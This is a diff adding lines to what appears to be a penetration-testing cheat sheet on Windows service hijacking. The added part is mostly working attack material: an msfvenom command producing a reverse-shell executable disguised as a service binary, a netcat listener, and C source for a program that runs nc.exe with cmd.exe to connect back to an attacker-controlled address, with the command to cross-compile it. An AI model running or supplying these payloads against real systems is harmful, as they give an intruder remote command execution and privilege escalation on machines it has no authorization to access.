@@ -192,6 +192,24 @@ Compilation on Kali (see cross-compiling.md):
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 ```
 
+Other malicious binary: 
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IpKali LPORT=$PortKali -f exe > ServiceToHijack.exe
+```
+and listen on Kali: `nc -lntp $PortKali` (beware of built-in firewalls) 
+
+Reverse shell binary, `addrshell.c`:
+```
+#include <stdlib.h>
+int main ()
+{
+  int i;
+  i = system ("c:\\some\\path\\nc.exe -t -e c:\\windows\\system32\\cmd.exe $IpAttacker $PortAttacke");
+  return 0;
+}
+```
+and cross-compile: `x86_64-w64-mingw32-gcc addrshell.c -o addrshell.exe`
+
 #### Auto
 
 Never blindly trust or rely on the output of automated tools. On Kali:
